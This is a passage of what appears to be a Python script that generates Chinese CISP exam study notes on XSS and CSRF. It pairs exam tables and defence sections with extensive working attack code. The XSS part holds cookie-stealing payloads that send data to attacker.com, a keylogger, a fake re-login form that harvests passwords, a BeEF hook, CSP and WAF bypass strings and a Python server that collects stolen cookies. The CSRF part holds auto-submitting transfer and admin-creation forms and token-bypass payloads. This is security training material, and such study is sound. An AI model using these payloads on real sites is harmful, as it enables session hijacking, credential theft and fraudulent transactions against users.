> **🔑 高分考点**：反射型XSS需要用户点击链接触发（非持久），存储型XSS恶意数据保存在服务器（持久），DOM型XSS完全在客户端发生（服务器端无感知）。

### 1.3 XSS注入点识别

```javascript
// 常见XSS注入位置
// 1. URL参数
http://target.com/search?q=<script>alert(1)</script>

// 2. 表单输入
<input type="text" name="username" value="[可控]">

// 3. HTTP Headers
User-Agent: <script>alert(1)</script>
Referer: <script>alert(1)</script>

// 4. URL Hash（DOM XSS）
http://target.com/page#<img src=x onerror=alert(1)>

// 5. JSON响应处理
{"name": "[可控]", "email": "test@test.com"}

// 6. Cookie值
document.cookie中读取并渲染的值
```

---

## 二、反射型XSS深度利用

### 2.1 反射型XSS基础

```html
<!-- 场景：搜索功能将用户输入直接回显在页面 -->
<!-- URL: http://target.com/search?q=test -->
<!-- 页面显示：您搜索的关键词是：test -->

<!-- 基础Payload -->
http://target.com/search?q=<script>alert('XSS')</script>

<!-- 绕过简单过滤 -->
http://target.com/search?q=<ScRiPt>alert(1)</ScRiPt>
http://target.com/search?q=<script>alert(1)</script>
http://target.com/search?q="><script>alert(1)</script>
http://target.com/search?q='><script>alert(1)</script>

<!-- 使用不同标签 -->
http://target.com/search?q=<img src=x onerror=alert(1)>
http://target.com/search?q=<svg onload=alert(1)>
http://target.com/search?q=<body onload=alert(1)>
http://target.com/search?q=<input onfocus=alert(1) autofocus>
http://target.com/search?q=<details open ontoggle=alert(1)>
http://target.com/search?q=<video><source onerror=alert(1)>
```

### 2.2 反射型XSS Cookie窃取

```javascript
// Payload: 窃取Cookie并发送到攻击者服务器
<script>
fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>

// 更隐蔽的方式
<script>
new Image().src = 'http://attacker.com/steal?c=' + document.cookie;
</script>

// 使用document.location跳转（钓鱼）
<script>document.location='http://attacker.com/phish?ref='+document.location;</script>

// 服务端接收脚本（PHP）
<?php
$cookie = $_GET['cookie'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'];
$data = "IP: $ip\\nCookie: $cookie\\nUA: $user_agent\\nReferer: $referer\\n---\\n";
file_put_contents('stolen_cookies.txt', $data, FILE_APPEND);
?>
```

---

## 三、存储型XSS深度利用

### 3.1 存储型XSS攻击

存储型XSS（Stored XSS）是最危险的XSS类型，因为恶意脚本被永久存储在服务器上：

```html
<!-- 场景：评论区功能 -->
<!-- 提交以下评论内容： -->

<!-- 基础弹窗 -->
<script>alert('XSS')</script>

<!-- 窃取所有访问者的Cookie -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal?cookie=' + document.cookie, true);
xhr.send();
</script>

<!-- 更隐蔽 - 仅1px图片 -->
<img src=x onerror="this.src='http://attacker.com/steal?c='+document.cookie" width=0 height=0>

<!-- 修改页面内容（网页篡改） -->
<script>
document.body.innerHTML = '<h1>This site has been hacked!</h1>';
</script>

<!-- 自动转发（恶意重定向） -->
<script>
setTimeout(function() {
    window.location.href = 'http://attacker.com/malware.exe';
}, 3000);
</script>
```

### 3.2 BeEF框架利用

```bash
# BeEF (Browser Exploitation Framework)
# 安装和启动
sudo apt install beef-xss
sudo beef-xss

# 获取Hook URL
# http://attacker.com:3000/hook.js

# 存储型XSS Payload（注入到评论区）
<script src="http://attacker.com:3000/hook.js"></script>

# BeEF功能：
# - 浏览器指纹信息
# - 已安装插件枚举
# - 内网端口扫描
# - 剪贴板窃取
# - 社会工程攻击
# - 持久化控制
```

---

## 四、DOM型XSS深度利用

### 4.1 DOM型XSS原理

DOM型XSS完全在客户端发生，恶意数据通过JavaScript操作DOM触发：

```javascript
// 漏洞代码示例
// 从URL Hash中读取并直接写入页面
var hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash;

// 攻击URL
http://target.com/page#<img src=x onerror=alert(1)>

// 常见DOM XSS源（Source）
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
location.href
location.search
location.hash
location.pathname
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB

// 常见DOM XSS汇（Sink）
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
eval()
setTimeout()
setInterval()
new Function()
location.assign()
location.replace()
location.href
```

### 4.2 DOM型XSS利用

```javascript
// 场景1：innerHTML注入
// 漏洞代码
document.getElementById('result').innerHTML = location.hash.substring(1);
// Payload
http://target.com/page#<img src=x onerror=alert(1)>

// 场景2：eval注入
// 漏洞代码
eval('var name = "' + location.search.split('=')[1] + '"');
// Payload
http://target.com/page?name=";alert(1);//

// 场景3：jQuery注入
// 漏洞代码
$('#result').html(location.hash);
// 或者
$('#result').append(location.hash);

// 场景4：AngularJS注入
// 漏洞代码（使用$interpolate或未过滤的模板）
<div ng-bind-html="userInput"></div>
// Payload
{{constructor.constructor('alert(1)')()}}

// 场景5：postMessage XSS
// 漏洞代码
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;
});
// 攻击代码
targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');
```

### 4.3 DOM XSS检测

```bash
# 使用浏览器开发者工具
# 1. 打开Sources面板
# 2. 搜索 innerHTML, document.write, eval 等sink
# 3. 跟踪数据流从source到sink

# 自动化工具
# DOM Invader (Burp Suite内置)
# - 自动检测DOM XSS
# - 识别source和sink
# - 生成Canary来追踪数据流

# 手动检测Payload
# javascript:alert(1)         # 伪协议
# "><script>alert(1)</script> # 标签闭合
# '-alert(1)-'                # 属性注入
# <img src=x onerror=alert(1)> # 事件处理
```

---

## 五、XSS高级Payload构造

### 5.1 绕过CSP限制

```javascript
// CSP绕过技术
// Content-Security-Policy: default-src 'self'

// 1. JSONP劫持（如果允许同源脚本）
<script src="/api/user?callback=alert(1)"></script>

// 2. AngularJS绕过（如果允许AngularJS）
<div ng-app ng-csp>
  <div ng-click=$event.view.alert(1)>Click me</div>
</div>

// 3. 利用允许的CDN域名
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script>
Element.insert('body', '<img src=x onerror=alert(1)>');
</script>

// 4. base-uri绕过
<base href="http://attacker.com/">
<script src="evil.js"></script>

// 5. 利用已加载的库
// 如果页面加载了jQuery
<script>
$.getScript('//attacker.com/evil.js');
</script>
```

### 5.2 高级Payload模板

```javascript
// 1. 多功能Payload
<script>
// 窃取Cookie
new Image().src = 'http://attacker.com/log?c=' + document.cookie;
// 窃取LocalStorage
new Image().src = 'http://attacker.com/log?ls=' + JSON.stringify(localStorage);
// 窃取页面内容
new Image().src = 'http://attacker.com/log?html=' + btoa(document.body.innerHTML);
// 键盘记录
document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/log?k=' + e.key;
};
</script>

// 2. 无script标签的Payload
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">
<svg/onload="fetch('http://attacker.com?c='+document.cookie)">
<body onload="$.getScript('//attacker.com/evil.js')">
<iframe srcdoc="<script>alert(1)</script>">

// 3. 编码混淆Payload
// JSFuck - 仅用6个字符编写JavaScript
// []()!+  → 可以表达任何JS代码
<script src="data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="></script>

// 4. 绕过长度限制
// 如果输入有长度限制，分片注入
<script src="http://attacker.com/a.js"></script>
// a.js只有几个字符，但加载外部大脚本
```

---

## 六、XSS会话劫持实战

### 6.1 Cookie窃取

```javascript
// 基础Cookie窃取
<script>document.location='http://attacker.com/?c='+document.cookie</script>

// 不跳转的Cookie窃取
<script>
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
</script>

// 使用fetch API
<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({cookie: document.cookie, url: location.href})
});
</script>

// HttpOnly Cookie绕过（如果可能）
// HttpOnly Cookie无法通过document.cookie读取
// 但可以通过XSS直接发起请求，浏览器自动带上Cookie
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin/change_password?newpass=hacker123', true);
xhr.withCredentials = true;
xhr.send();
</script>
```

### 6.2 XSS接收服务器搭建

```python
#!/usr/bin/env python3
# XSS Cookie接收服务器
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime

class XSSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 解析参数
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        # 记录
        with open('xss_log.txt', 'a') as f:
            f.write(f"[{datetime.now()}] {self.client_address[0]}\\n")
            f.write(f"URL: {self.path}\\n")
            f.write(f"User-Agent: {self.headers.get('User-Agent', 'N/A')}\\n")
            f.write(f"Referer: {self.headers.get('Referer', 'N/A')}\\n")
            f.write(f"Params: {params}\\n")
            f.write("-" * 50 + "\\n")
        
        # 返回1x1透明图片（不引起怀疑）
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()
        # 1x1透明GIF
        self.wfile.write(b'GIF89a\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\xff\\xff\\xff\\x00\\x00\\x00!\\xf9\\x04\\x00\\x00\\x00\\x00\\x00,\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x02\\x02D\\x01\\x00;')

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 80), XSSHandler)
    print('[+] XSS接收服务器启动在端口80')
    server.serve_forever()
```

---

## 七、XSS钓鱼与键盘记录

### 7.1 XSS钓鱼攻击

```javascript
// 伪造登录表单
<script>
// 替换页面内容为伪造的登录表单
document.body.innerHTML = `
<div style="max-width:400px;margin:100px auto;padding:20px;border:1px solid #ccc;">
    <h2>Session Expired</h2>
    <p>Please re-enter your credentials:</p>
    <input id="user" placeholder="Username" style="width:100%;padding:10px;margin:5px 0;"><br>
    <input id="pass" type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;"><br>
    <button onclick="steal()" style="width:100%;padding:10px;background:#007bff;color:white;border:none;">Login</button>
</div>
`;
function steal() {
    var u = document.getElementById('user').value;
    var p = document.getElementById('pass').value;
    new Image().src = 'http://attacker.com/steal?u=' + u + '&p=' + p;
    // 重定向到真实网站
    location.href = 'https://real-site.com';
}
</script>
```

### 7.2 键盘记录器

```javascript
// XSS键盘记录器
<script>
var keys = '';
document.onkeypress = function(e) {
    keys += e.key;
    // 每收集30个字符发送一次
    if (keys.length >= 30) {
        new Image().src = 'http://attacker.com/keys?d=' + encodeURIComponent(keys);
        keys = '';
    }
};
// 页面离开前发送剩余按键
window.onbeforeunload = function() {
    if (keys.length > 0) {
        navigator.sendBeacon('http://attacker.com/keys', keys);
    }
};
</script>
```

---

## 八、XSS绕过技术

### 8.1 标签与事件绕过

```html
<!-- 当<script>被过滤时 -->
<!-- 常用替代标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>

<!-- 使用javascript伪协议 -->
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><button>submit</button></form>
<button formaction="javascript:alert(1)">click</button>

<!-- 事件绕过 -->
<!-- 当onerror被过滤 -->
<img src=x onmouseover=alert(1)>
<div onmouseover=alert(1)>hover me</div>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x>
```

### 8.2 关键字过滤绕过

```html
<!-- script 被过滤 -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<scri<!--comment-->pt>alert(1)</script>

<!-- alert 被过滤 -->
<script>window['al'+'ert'](1)</script>
<script>window['\\x61lert'](1)</script>
<script>(alert)(1)</script>
<script>top['alert'](1)</script>
<script>[].constructor.constructor('alert(1)')()</script>

<!-- () 被过滤 -->
<script>onerror=alert;throw 1</script>
<script>alert`1`</script>  <!-- 模板字符串 -->

<!-- 空格被过滤 -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<script>alert(1)</script>

<!-- 引号被过滤 -->
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/.source)</script>
```

### 8.3 WAF特定绕过

```html
<!-- Cloudflare绕过 -->
<svg onload=prompt%26%230000000040document.domain)>
<a href="jAvAsCrIpT:alert(1)">

<!-- ModSecurity绕过 -->
<scri<!-- -->pt>alert(1)</script>
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- Imperva绕过 -->
<script>self['alert']('xss')</script>
<svg><use href="data:image/svg+xml,<svg onload=alert(1)>">

<!-- 通用绕过技巧 -->
<script>setTimeout`alert\\x281\\x29`</script>
<script>Function`alert\\x281\\x29```</script>
<script>Reflect.get(window,'alert')(1)</script>
```

---

## 九、XSS自动化工具

### 9.1 XSStrike

```bash
# XSStrike - 高级XSS检测和利用工具
python3 xsstrike.py -u "http://target.com/search?q=test"
python3 xsstrike.py -u "http://target.com/search?q=test" --crawl
python3 xsstrike.py -u "http://target.com/search?q=test" --fuzzer

# 功能特性：
# - 上下文分析（HTML/Attribute/JavaScript）
# - WAF检测和绕过
# - 智能Payload生成
# - DOM XSS检测
# - 反射型XSS检测
```

### 9.2 Dalfox

```bash
# Dalfox - 快速XSS扫描器（Go语言）
dalfox url http://target.com/search?q=test
dalfox file urls.txt
dalfox pipe  # 从管道读取URL

# 带Cookie扫描
dalfox url http://target.com/page --cookie "session=abc123"

# 自定义Payload
dalfox url http://target.com/page --custom-payload payloads.txt

# 输出格式
dalfox url http://target.com/page -o results.json --format json
```

### 9.3 XSSer

```bash
# XSSer - XSS自动检测框架
xsser --url "http://target.com/search?q=XSS"
xsser --url "http://target.com/search?q=XSS" --auto
xsser --url "http://target.com/search?q=XSS" --Fuzz

# 绕过选项
xsser --url "http://target.com/search?q=XSS" --Hex
xsser --url "http://target.com/search?q=XSS" --Str
xsser --url "http://target.com/search?q=XSS" --Une
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | XSS三种类型 | ★★★★★ | ★★ | 反射型（非持久）、存储型（持久）、DOM型（客户端） |
| 2 | XSS危害 | ★★★★★ | ★ | 窃取Cookie、会话劫持、钓鱼、网页篡改 |
| 3 | 反射型XSS触发 | ★★★★ | ★ | 用户点击恶意链接 |
| 4 | 存储型XSS触发 | ★★★★ | ★ | 访问含恶意数据的页面 |
| 5 | DOM型XSS特征 | ★★★★ | ★★ | 完全在客户端，服务器无感知 |
| 6 | Cookie窃取 | ★★★★ | ★★ | document.cookie发送到攻击者服务器 |
| 7 | XSS防御 | ★★★★★ | ★★ | 输出编码、CSP、HttpOnly、输入验证 |
| 8 | HttpOnly作用 | ★★★★ | ★★ | 防止JavaScript读取Cookie |
| 9 | CSP作用 | ★★★★ | ★★★ | 内容安全策略，限制资源加载来源 |
| 10 | BeEF框架 | ★★★ | ★★ | Browser Exploitation Framework |

### 💡 知识巧记口诀

> **"XSS三类记"** — 反射型（链接触发，非持久）、存储型（访问触发，持久）、DOM型（客户端触发，无服务端感知）。记住：**"反链存访D客户"**。

> **"XSS防御三件套"** — 输出编码（HTML Entity）、CSP（限制资源来源）、HttpOnly（防Cookie读取）。记住：**"编码限源防读取"**。

> **"绕过五法"** — 大小写、标签替换、编码混淆、事件劫持、注释分割。记住：**"大替编事注"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "HttpOnly能完全防止XSS" | ❌ 错误！HttpOnly仅防Cookie读取，不能防其他XSS危害 |
| "CSP可以100%防XSS" | ❌ 错误！CSP可能被绕过（JSONP、CDN、AngularJS） |
| "DOM型XSS在服务器端产生" | ❌ 错误！DOM型XSS完全在客户端JavaScript中发生 |
| "输出编码后一定安全" | ❌ 不绝对！不同上下文需要不同的编码方式 |

---

## 学习建议

1. 🧪 **搭建XSS练习环境**：使用DVWA、XSS-Game等平台练习
2. 🔍 **理解上下文**：HTML上下文、属性上下文、JS上下文、CSS上下文的编码要求不同
3. 📝 **收集Payload库**：整理不同场景的XSS Payload，建立自己的武器库
4. 🛡️ **学习CSP策略**：深入理解Content-Security-Policy的配置和绕过
5. 🧠 **理解浏览器安全机制**：同源策略、HttpOnly、CSP、XSS Auditor等

---

> **XSS的可怕之处不在于它能弹窗，而在于它能让你变成受害者浏览器中的"隐形人"——在用户毫无察觉的情况下，窃取一切、控制一切。防御XSS的最好方法，就是假设所有输入都是恶意的。**
""")

print("\nDays 1-10 done, continuing with days 11-20...")

# ===================================================================
# Day 11：CSRF深度利用
# ===================================================================
gen('day-11.md', """# Day 11：CSRF深度利用

> **📘 文档定位**：CISP 考试核心基础 | 难度：中级 | 预计阅读：40 分钟
>
> 跨站请求伪造（CSRF，Cross-Site Request Forgery）是一种挟持用户在当前已登录的Web应用上执行非本意操作的攻击方式。与XSS不同，CSRF不窃取用户数据，而是"借用"用户的身份执行操作。在渗透测试中，CSRF往往与XSS配合使用，形成致命的攻击组合。

---

## 导航目录

- [一、CSRF攻击原理](#一csrf攻击原理)
- [二、CSRF攻击场景分类](#二csrf攻击场景分类)
- [三、GET型CSRF攻击](#三get型csrf攻击)
- [四、POST型CSRF攻击](#四post型csrf攻击)
- [五、JSON型CSRF绕过](#五json型csrf绕过)
- [六、CSRF Token绕过技术](#六csrf-token绕过技术)
- [七、CSRF与XSS组合攻击](#七csrf与xss组合攻击)
- [八、CSRF自动化工具](#八csrf自动化工具)
- [九、CSRF防御机制](#九csrf防御机制)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、CSRF攻击原理

### 1.1 CSRF攻击流程

```
CSRF攻击流程：
受害者                 攻击者网站               目标网站
  │                       │                      │
  │  1. 已登录目标网站    │                      │
  │─────────────────────────────────────────────►│
  │  2. Cookie保存在浏览器│                      │
  │                       │                      │
  │  3. 访问攻击者页面    │                      │
  │──────────────────────►│                      │
  │                       │                      │
  │  4. 返回含恶意请求页面│                      │
  │◄──────────────────────│                      │
  │                       │                      │
  │  5. 浏览器自动发送请求（带Cookie）            │
  │─────────────────────────────────────────────►│
  │                       │                      │
  │  6. 目标网站执行操作  │                      │
  │◄─────────────────────────────────────────────│
```

### 1.2 CSRF成立条件

| 条件 | 说明 |
|:---|:---|
| 用户已登录目标网站 | 浏览器保存了有效的认证Cookie |
| 目标操作可预测 | 攻击者知道完整的请求参数 |
| 无有效CSRF防护 | 缺少CSRF Token或Referer验证 |
| 浏览器自动发送Cookie | 默认行为，跨域请求也会带Cookie |

> **🔑 高分考点**：CSRF攻击的三个必要条件——**用户已认证**（Cookie有效）、**请求可预测**（参数已知）、**无CSRF防护**（无Token验证）。

---

## 二、CSRF攻击场景分类

### 2.1 攻击类型

| 类型 | HTTP方法 | 触发方式 | 难度 |
|:---|:---|:---|:---|
| GET型CSRF | GET | img标签/链接点击 | 低 |
| POST型CSRF | POST | 自动提交表单 | 中 |
| JSON型CSRF | POST+JSON | XHR+Content-Type绕过 | 高 |
| Flash CSRF | 任意 | Flash跨域请求 | 高（Flash已淘汰）|

### 2.2 典型攻击场景

```html
<!-- 场景1：修改密码 -->
<!-- 正常请求：POST /change_password -->
<!-- 参数：new_password=hacker123&confirm_password=hacker123 -->

<!-- 场景2：转账 -->
<!-- 正常请求：POST /transfer -->
<!-- 参数：to_account=attacker&amount=10000 -->

<!-- 场景3：修改邮箱 -->
<!-- 正常请求：POST /update_email -->
<!-- 参数：email=attacker@evil.com -->

<!-- 场景4：添加管理员 -->
<!-- 正常请求：POST /admin/add_user -->
<!-- 参数：username=hacker&role=admin&password=123456 -->
```

---

## 三、GET型CSRF攻击

### 3.1 基础GET CSRF

```html
<!-- 场景：银行转账功能使用GET请求 -->
<!-- 正常URL: http://bank.com/transfer?to=12345&amount=1000 -->

<!-- 攻击方式1：img标签 -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" width="0" height="0">

<!-- 攻击方式2：iframe隐藏加载 -->
<iframe src="http://bank.com/transfer?to=attacker&amount=10000" style="display:none;"></iframe>

<!-- 攻击方式3：script标签 -->
<script src="http://bank.com/transfer?to=attacker&amount=10000"></script>

<!-- 攻击方式4：link标签 -->
<link rel="stylesheet" href="http://bank.com/transfer?to=attacker&amount=10000">

<!-- 攻击方式5：自动跳转 -->
<script>document.location='http://bank.com/transfer?to=attacker&amount=10000';</script>

<!-- 攻击方式6：表单GET提交 -->
<form action="http://bank.com/transfer" method="GET">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

---

## 四、POST型CSRF攻击

### 4.1 自动提交表单

```html
<!-- POST CSRF 基础攻击 -->
<html>
<body>
  <h1>Loading...</h1>
  <form id="csrf_form" action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="currency" value="USD">
  </form>
  <script>
    document.getElementById('csrf_form').submit();
  </script>
</body>
</html>

<!-- 使用iframe进行隐蔽POST -->
<iframe name="hidden_frame" style="display:none;"></iframe>
<form action="http://target.com/action" method="POST" target="hidden_frame">
  <input type="hidden" name="param" value="value">
</form>
<script>document.forms[0].submit();</script>

<!-- 多步骤CSRF -->
<!-- Step 1: 删除旧邮箱 -->
<form id="f1" action="http://target.com/delete_email" method="POST">
  <input name="email_id" value="1">
</form>
<!-- Step 2: 添加新邮箱 -->
<form id="f2" action="http://target.com/add_email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>
  document.getElementById('f1').submit();
  setTimeout(function() {
    document.getElementById('f2').submit();
  }, 2000);
</script>
```

### 4.2 使用JavaScript AJAX发起CSRF

```javascript
// XMLHttpRequest CSRF
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/action', true);
xhr.withCredentials = true;  // 关键：携带Cookie
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('param1=value1&param2=value2');

// Fetch API CSRF
fetch('http://target.com/action', {
    method: 'POST',
    credentials: 'include',  // 关键：携带Cookie
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'param1=value1&param2=value2'
});

// jQuery AJAX CSRF
$.ajax({
    url: 'http://target.com/action',
    type: 'POST',
    xhrFields: { withCredentials: true },
    data: { param1: 'value1', param2: 'value2' }
});
```

---

## 五、JSON型CSRF绕过

### 5.1 Content-Type绕过

```javascript
// 场景：服务器只接受 application/json
// 但CORS预检可能阻止跨域JSON请求

// 绕过方法1：使用text/plain
fetch('http://target.com/api/action', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: '{"key":"value"}'
});
// 某些服务器只检查是否包含json字符串，不检查Content-Type

// 绕过方法2：使用URLSearchParams（自动设置form-urlencoded）
var params = new URLSearchParams();
params.append('{"key":"value"}', '');  // 特殊技巧
fetch('http://target.com/api/action', {
    method: 'POST',
    credentials: 'include',
    body: params
});

// 绕过方法3：Flash CSRF（如果Flash仍可用）
// 使用Flash设置自定义Content-Type并携带Cookie
```

### 5.2 JSON CSRF POC生成

```html
<!-- 使用form提交JSON数据 -->
<html>
<body>
<form id="poc" action="http://target.com/api/user" method="POST" enctype="text/plain">
  <input type="hidden" name='{"username":"hacker","role":"admin","ignored":"' value='"}'>
</form>
<script>document.getElementById('poc').submit();</script>
</body>
</html>
<!-- 实际发送的数据：{"username":"hacker","role":"admin","ignored":"="} -->
```

---

## 六、CSRF Token绕过技术

### 6.1 Token绕过技术

```bash
# CSRF Token绕过方法
# 1. Token未与用户会话绑定
#    - 使用自己的Token攻击其他用户
#    - 多个用户可使用同一Token

# 2. Token验证不完整
#    - 删除Token参数测试
#    - 修改Token为空值
#    - 使用旧Token

# 3. Token在Cookie中
#    - 如果Token同时在Cookie和参数中
#    - 且只验证两者一致而不验证来源
#    - 攻击者可同时设置Cookie和参数

# 4. Token可预测
#    - 基于时间的Token
#    - 基于用户名的Token（如MD5(username))
#    - 基于递增数字的Token

# 5. Token泄露
#    - 通过Referer泄露
#    - 通过URL参数泄露
#    - 通过错误页面泄露
```

### 6.2 绕过Referer检查

```html
<!-- Referer绕过技术 -->
<!-- 1. 从HTTPS到HTTP，不发送Referer -->
<!-- 攻击页面使用HTTPS，目标使用HTTP -->

<!-- 2. 使用meta标签控制Referer -->
<meta name="referrer" content="no-referrer">
<!-- 或 -->
<meta name="referrer" content="never">

<!-- 3. 使用data: URL -->
<iframe src="data:text/html,<form action='http://target.com/action' method='POST' id='f'><input name='p' value='v'></form><script>document.getElementById('f').submit()</script>"></iframe>

<!-- 4. 利用Referer策略 -->
<!-- Referrer-Policy: unsafe-url → 发送完整Referer -->
<!-- Referrer-Policy: no-referrer → 不发送Referer -->
<!-- Referrer-Policy: origin → 仅发送源 -->
```

---

## 七、CSRF与XSS组合攻击

### 7.1 XSS绕过CSRF防护

```javascript
// 场景：存在XSS漏洞的页面，但有CSRF Token防护
// 利用XSS读取CSRF Token，然后发起CSRF攻击

// Step 1: 通过XSS获取CSRF Token
var token = document.querySelector('input[name="csrf_token"]').value;

// Step 2: 使用获取的Token发起请求
var xhr = new XMLHttpRequest();
xhr.open('POST', '/admin/delete_user', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('csrf_token=' + token + '&user_id=1');

// 完整的XSS+CSRF组合Payload
<script>
// 获取页面上的CSRF Token
var csrf = document.getElementsByName('csrf_token')[0].value;
// 发起CSRF请求
var xhr = new XMLHttpRequest();
xhr.open('POST', '/admin/change_password', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('csrf_token=' + csrf + '&new_password=hacker123');
// 不跳转，不留痕迹
</script>
```

### 7.2 Login CSRF

```html
<!-- Login CSRF：强制受害者登录到攻击者的账号 -->
<form action="http://target.com/login" method="POST">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="password" value="attacker123">
</form>
<script>document.forms[0].submit();</script>
<!-- 受害者之后的操作都在攻击者账号中 -->
<!-- 攻击者可以查看受害者的操作历史 -->
```

---

## 八、CSRF自动化工具

### 8.1 Burp Suite CSRF PoC生成

```bash
# Burp Suite 生成CSRF PoC
# 1. 在Proxy中找到目标请求
# 2. 右键 → Engagement tools → Generate CSRF PoC
# 3. 自动生成HTML表单
# 4. 可自定义表单参数
# 5. 复制HTML保存为.html文件
```

### 8.2 CSRF Scanner

```bash
# XSRFProbe - CSRF审计工具
python3 xsrfprobe.py -u http://target.com/endpoint
python3 xsrfprobe.py -u http://target.com/endpoint -d "param1=val1&param2=val2"
python3 xsrfprobe.py -u http://target.com/endpoint --cookie "session=abc123"
```

---

## 九、CSRF防御机制

### 9.1 CSRF Token

```html
<!-- 同步令牌模式（Synchronizer Token Pattern）-->
<!-- 服务端生成随机Token -->
<input type="hidden" name="csrf_token" value="random_token_here">

<!-- 验证逻辑 -->
<?php
session_start();
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF validation failed');
}
?>

<!-- Token要求 -->
<!-- 1. 随机、不可预测 -->
<!-- 2. 与用户会话绑定 -->
<!-- 3. 每次请求或定期更换 -->
<!-- 4. 使用安全的随机数生成器 -->
```

### 9.2 SameSite Cookie

```
SameSite Cookie 属性：
Strict:   完全禁止跨站发送Cookie
Lax:      允许顶级导航(GET)的跨站请求携带Cookie
None:     允许所有跨站请求（需配合Secure）

Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly

SameSite Lax的局限性：
- 仍然允许GET型CSRF（如通过链接点击）
- POST请求被阻止
```

### 9.3 综合防御策略

| 防御层 | 技术 | 效果 |
|:---|:---|:---|
| 第一层 | CSRF Token | 验证请求来源合法性 |
| 第二层 | SameSite Cookie | 阻止跨站请求携带Cookie |
| 第三层 | 验证Referer/Origin | 检查请求来源 |
| 第四层 | 二次认证 | 敏感操作要求重新输入密码 |
| 第五层 | 自定义请求头 | 要求X-Requested-With等自定义头 |

> **🔑 高分考点**：CSRF防御的黄金标准是**CSRF Token + SameSite Cookie + Referer/Origin验证**三重防护。

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | CSRF定义 | ★★★★★ | ★ | 挟持用户身份执行非本意操作 |
| 2 | CSRF成立条件 | ★★★★ | ★★ | 已认证+可预测请求+无防护 |
| 3 | GET/POST CSRF | ★★★★ | ★★ | GET用img标签，POST用自动提交表单 |
| 4 | CSRF Token | ★★★★★ | ★★ | 随机令牌，与会话绑定 |
| 5 | SameSite Cookie | ★★★★ | ★★ | Strict/Lax/None |
| 6 | Referer验证 | ★★★ | ★★ | 检查请求来源 |
| 7 | CSRF vs XSS | ★★★★ | ★★ | XSS窃取数据，CSRF借用身份 |
| 8 | JSON CSRF | ★★★ | ★★★ | Content-Type绕过 |
| 9 | Login CSRF | ★★★ | ★★ | 强制用户登录到攻击者账号 |
| 10 | 防御策略 | ★★★★ | ★★ | Token + SameSite + Referer |

### 💡 知识巧记口诀

> **"CSRF三条件"** — 已登录（有Cookie）、请求可预测（参数已知）、无防护（无Token）。记住：**"登测防"**——已登录、可预测、无防护。

> **"防御三重奏"** — CSRF Token（验证令牌）、SameSite Cookie（限制跨站）、Referer验证（检查来源）。记住：**"令牌限制检查源"**。

